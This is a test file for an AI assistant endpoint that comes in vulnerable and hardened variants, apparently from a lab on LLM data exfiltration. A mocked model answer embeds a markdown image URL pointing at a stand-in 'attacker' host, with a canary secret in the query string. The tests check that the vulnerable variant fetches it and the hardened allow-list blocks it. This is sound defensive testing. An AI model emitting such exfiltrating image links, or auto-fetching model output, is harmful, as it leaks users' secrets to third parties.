import express from "express";
import request from "supertest";
import { describe, expect, it, vi } from "vitest";
import type { AppConfig } from "../config.js";
import { createLogger } from "../logger.js";
import { createAssistantHandler } from "./assistant.js";

const logger = createLogger({ appName: "test" });

const EXFIL_ANSWER =
  "See ![x](http://attacker:9000/log?s=CANARY-EXFIL-a1b2c3d4)";

function baseConfig(variant: "vulnerable" | "hardened"): AppConfig {
  return {
    variant,
    port: 3000,
    ollamaBaseUrl: "http://ollama:11434",
    ollamaModel: "qwen2.5:3b",
    assistantSecret: "CANARY-EXFIL-a1b2c3d4",
    attackerHost: "attacker",
  };
}

function buildApp(
  variant: "vulnerable" | "hardened",
  fetchFn: (url: string) => Promise<unknown>,
) {
  const app = express();
  app.use(express.json());
  const chatFn = vi.fn(async () => EXFIL_ANSWER);
  app.post(
    "/assistant",
    createAssistantHandler({
      config: baseConfig(variant),
      logger,
      chatFn,
      fetchFn: fetchFn as unknown as typeof fetch,
    }),
  );
  return app;
}

describe("POST /assistant", () => {
  it("vulnerable: fetches every image URL from the model answer (exfil sink fires)", async () => {
    const fetchFn = vi.fn(async () => ({ ok: true }));
    const app = buildApp("vulnerable", fetchFn);

    const res = await request(app)
      .post("/assistant")
      .send({ document: "doc", question: "q" });

    expect(res.status).toBe(200);
    expect(res.body.answer).toBe(EXFIL_ANSWER);
    expect(fetchFn).toHaveBeenCalledTimes(1);
    expect(fetchFn).toHaveBeenCalledWith(
      "http://attacker:9000/log?s=CANARY-EXFIL-a1b2c3d4",
    );
  });

  it("hardened: denies the image URL (not on the allow-list) and never fetches it", async () => {
    const fetchFn = vi.fn(async () => ({ ok: true }));
    const app = buildApp("hardened", fetchFn);

    const res = await request(app)
      .post("/assistant")
      .send({ document: "doc", question: "q" });

    expect(res.status).toBe(200);
    expect(res.body.answer).toBe(EXFIL_ANSWER);
    expect(fetchFn).not.toHaveBeenCalled();
  });
});
